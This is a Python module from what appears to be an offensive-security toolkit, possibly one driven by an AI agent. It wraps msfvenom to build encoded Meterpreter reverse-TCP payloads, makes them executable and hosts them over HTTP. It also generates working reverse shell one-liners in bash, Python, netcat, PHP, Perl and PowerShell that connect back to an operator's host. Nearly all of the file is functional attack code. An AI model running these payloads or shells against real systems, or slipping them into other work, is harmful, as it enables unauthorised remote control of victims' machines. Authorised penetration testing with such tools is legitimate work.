#!/usr/bin/env python3
"""Payload Generator - msfvenom payload generation and reverse shell one-liners."""

import functools
import os
import subprocess
import uuid
import shutil
import threading
import http.server
import socketserver
from typing import Dict, Any
from core.config import logger


class PayloadGenerator:
    """Generate payloads via msfvenom and serve reverse shell one-liners."""

    def __init__(self):
        self.payloads_dir = os.path.join(os.getcwd(), "payloads")
        os.makedirs(self.payloads_dir, exist_ok=True)
        self._hosting_server = None
        self._hosting_thread = None
        self._hosting_port = None

    def list_templates(self) -> Dict[str, Any]:
        """List available msfvenom payloads and encoders."""
        result = {"success": True, "payloads": [], "encoders": []}
        msfvenom = shutil.which("msfvenom")
        if not msfvenom:
            return {"success": False, "error": "msfvenom not found — metasploit may not be installed"}

        try:
            proc = subprocess.run(
                ["msfvenom", "--list", "payloads"],
                capture_output=True, text=True, timeout=30, check=False,
            )
            for line in proc.stdout.splitlines():
                line = line.strip()
                if "/" in line and not line.startswith("=") and not line.startswith("Framework"):
                    parts = line.split(None, 1)
                    if parts:
                        result["payloads"].append({
                            "name": parts[0],
                            "description": parts[1] if len(parts) > 1 else "",
                        })
        except subprocess.TimeoutExpired:
            result["payloads"] = []
            result["warnings"] = ["Payload listing timed out"]

        try:
            proc = subprocess.run(
                ["msfvenom", "--list", "encoders"],
                capture_output=True, text=True, timeout=30, check=False,
            )
            for line in proc.stdout.splitlines():
                line = line.strip()
                if "/" in line and not line.startswith("=") and not line.startswith("Framework"):
                    parts = line.split(None, 1)
                    if parts:
                        result["encoders"].append({
                            "name": parts[0],
                            "description": parts[1] if len(parts) > 1 else "",
                        })
        except subprocess.TimeoutExpired:
            result["encoders"] = []

        return result

    def generate(
        self,
        lhost: str,
        lport: int = 4444,
        payload: str = "windows/meterpreter/reverse_tcp",
        format_type: str = "exe",
        encoder: str = "",
        iterations: int = 1,
        bad_chars: str = "",
        nops: int = 0,
        template_name: str = "",
        output_name: str = "",
    ) -> Dict[str, Any]:
        """Generate a payload using msfvenom."""
        msfvenom = shutil.which("msfvenom")
        if not msfvenom:
            return {"success": False, "error": "msfvenom not found — metasploit may not be installed"}

        payload_id = str(uuid.uuid4())[:8]
        if not output_name:
            output_name = f"payload_{payload_id}.{format_type}"
        output_path = os.path.join(self.payloads_dir, output_name)

        cmd = [
            "msfvenom",
            "-p", payload,
            f"LHOST={lhost}",
            f"LPORT={lport}",
            "-f", format_type,
            "-o", output_path,
        ]
        if encoder:
            cmd.extend(["-e", encoder, "-i", str(iterations)])
        if bad_chars:
            cmd.extend(["-b", bad_chars])
        if nops:
            cmd.extend(["-n", str(nops)])
        if template_name:
            cmd.extend(["-x", template_name])

        try:
            proc = subprocess.run(cmd, capture_output=True, text=True, timeout=120, check=False)
            if proc.returncode != 0:
                return {"success": False, "error": proc.stderr.strip(), "command": " ".join(cmd)}

            # Producing the file is the entire job, so check it exists and has
            # bytes rather than inferring it from a zero exit. This used to
            # report success with size 0 whenever msfvenom exited clean without
            # writing anything.
            if not os.path.isfile(output_path):
                return {
                    "success": False,
                    "error": (
                        f"msfvenom exited 0 but wrote no file at {output_path}"
                    ),
                    "command": " ".join(cmd),
                    "stderr": proc.stderr.strip(),
                }
            size = os.path.getsize(output_path)
            if size == 0:
                return {
                    "success": False,
                    "error": f"msfvenom wrote an empty file at {output_path}",
                    "command": " ".join(cmd),
                    "stderr": proc.stderr.strip(),
                }

            # A payload you have to chmod before it runs is a papercut the
            # tool can spare the operator: msfvenom's -o leaves 0644, so a
            # freshly generated ELF fails with "Permission denied".
            executable = format_type.lower().startswith(("elf", "exe", "macho"))
            if executable:
                try:
                    os.chmod(output_path, 0o755)
                except OSError as e:
                    logger.warning(f"Could not chmod {output_path}: {e}")
                    executable = False

            return {
                "success": True,
                "payload_id": payload_id,
                "file": output_name,
                "path": output_path,
                "size": size,
                "executable": executable,
                "payload_type": payload,
                "format": format_type,
                "lhost": lhost,
                "lport": lport,
            }
        except subprocess.TimeoutExpired:
            return {"success": False, "error": "msfvenom timed out after 120 seconds"}

    def list_payloads(self) -> Dict[str, Any]:
        """List all generated payloads on disk."""
        payloads = []
        if os.path.isdir(self.payloads_dir):
            for name in os.listdir(self.payloads_dir):
                fpath = os.path.join(self.payloads_dir, name)
                if os.path.isfile(fpath):
                    payloads.append({
                        "name": name,
                        "size": os.path.getsize(fpath),
                        "path": fpath,
                    })
        return {"success": True, "payloads": payloads, "count": len(payloads)}

    def delete_payload(self, payload_id: str) -> Dict[str, Any]:
        """Delete a generated payload by filename or id fragment."""
        if not payload_id:
            return {"success": False, "error": "payload_id is required"}
        for name in os.listdir(self.payloads_dir):
            if payload_id in name:
                os.remove(os.path.join(self.payloads_dir, name))
                return {"success": True, "deleted": name}
        return {"success": False, "error": f"Payload '{payload_id}' not found"}

    def start_hosting(self, port: int = 8888) -> Dict[str, Any]:
        """Start a simple HTTP server to host generated payloads."""
        if self._hosting_server is not None:
            # Saying only "already running" left the caller with no way to
            # learn where it is -- there is no status tool, so an agent that
            # lost the URL could not get it back without stopping the server.
            running_port = self._hosting_port
            return {
                "success": False,
                "error": (
                    f"Hosting server is already running on port {running_port}. "
                    "Stop it with payload_host_stop to move it."
                ),
                "port": running_port,
                "url": f"http://<your-ip>:{running_port}/",
                "directory": self.payloads_dir,
            }
        try:
            # Serve from the payloads directory WITHOUT chdir. os.chdir is
            # process-wide, not per-thread, so the old version relocated the
            # whole backend: after start_hosting the cwd went from /app/tmp to
            # /app/payloads and stayed there, and every later zebbern_exec
            # inherited it. A scan writing a relative -oN landed in
            # /app/payloads, which unlike /app/tmp is not the mounted volume,
            # so a container recreate destroyed it.
            handler = functools.partial(
                http.server.SimpleHTTPRequestHandler, directory=self.payloads_dir
            )
            self._hosting_server = socketserver.TCPServer(("0.0.0.0", int(port)), handler)
            self._hosting_port = int(port)
            self._hosting_thread = threading.Thread(
                target=self._serve, daemon=True
            )
            self._hosting_thread.start()
            return {
                "success": True,
                "port": int(port),
                "url": f"http://<your-ip>:{int(port)}/",
                "directory": self.payloads_dir,
            }
        except OSError as e:
            self._hosting_server = None
            self._hosting_port = None
            return {"success": False, "error": str(e)}

    def _serve(self):
        """Run the hosting server (called in a thread)."""
        self._hosting_server.serve_forever()

    def stop_hosting(self) -> Dict[str, Any]:
        """Stop the payload hosting server."""
        if self._hosting_server is None:
            return {"success": False, "error": "No hosting server is running"}
        self._hosting_server.shutdown()
        self._hosting_server = None
        self._hosting_thread = None
        stopped_port = self._hosting_port
        self._hosting_port = None
        return {
            "success": True,
            "message": f"Hosting server on port {stopped_port} stopped",
            "port": stopped_port,
        }

    def get_one_liner(
        self, lhost: str, lport: int = 4444, shell_type: str = "all"
    ) -> Dict[str, Any]:
        """Generate reverse shell one-liners."""
        port = str(lport)
        shells: Dict[str, str] = {
            "bash": f"bash -i >& /dev/tcp/{lhost}/{port} 0>&1",
            "python": (
                f"python3 -c 'import socket,subprocess,os;"
                f"s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
                f"s.connect((\"{lhost}\",{port}));"
                f"os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);"
                f"subprocess.call([\"/bin/sh\",\"-i\"])'"
            ),
            "nc": f"nc -e /bin/sh {lhost} {port}",
            "nc_mkfifo": f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {port} >/tmp/f",
            "php": (
                f"php -r '$sock=fsockopen(\"{lhost}\",{port});"
                f"exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
            ),
            "perl": (
                f"perl -e 'use Socket;$i=\"{lhost}\";$p={port};"
                f"socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));"
                f"if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");"
                f"open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\")}};'"
            ),
            "powershell": (
                f"powershell -nop -c \"$c=New-Object System.Net.Sockets.TCPClient('{lhost}',{port});"
                f"$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};while(($i=$s.Read($b,0,$b.Length)) -ne 0)"
                f"{{$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);"
                f"$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';"
                f"$sb=([text.encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length);$s.Flush()}};"
                f"$c.Close()\""
            ),
        }

        if shell_type != "all" and shell_type in shells:
            return {"success": True, "one_liners": {shell_type: shells[shell_type]}}
        if shell_type != "all" and shell_type not in shells:
            return {
                "success": False,
                "error": f"Unknown shell type: {shell_type}",
                "available": list(shells.keys()),
            }
        return {"success": True, "one_liners": shells, "lhost": lhost, "lport": lport}


# Module-level singleton used by routes.py
payload_generator = PayloadGenerator()
